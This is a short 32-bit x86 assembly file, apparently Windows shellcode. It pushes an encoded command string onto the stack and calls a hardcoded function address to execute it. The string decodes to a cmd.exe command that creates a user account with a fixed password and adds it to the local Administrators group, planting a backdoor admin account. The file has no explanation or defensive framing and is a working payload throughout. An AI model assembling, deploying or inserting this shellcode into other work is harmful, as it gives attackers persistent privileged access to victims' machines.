[BITS 32]

_start:
	xor eax,eax
	push eax
	push 0x20202022
	push 0x6464612f
	push 0x20727375
	push 0x70616966
	push 0x2073726f
	push 0x74617274
	push 0x73696e69
	push 0x6d646120
	push 0x70756f72
	push 0x676c6163
	push 0x6f6c2074
	push 0x656e2026
	push 0x26206464
	push 0x612f2033
	push 0x32317373
	push 0x61504020
	push 0x72737570
	push 0x61696620
	push 0x72657375
	push 0x2074656e
	push 0x2220632f
	push 0x20657865
	push 0x2e646d63
	push esp
	
	mov eax, 0x72741a4f
	call eax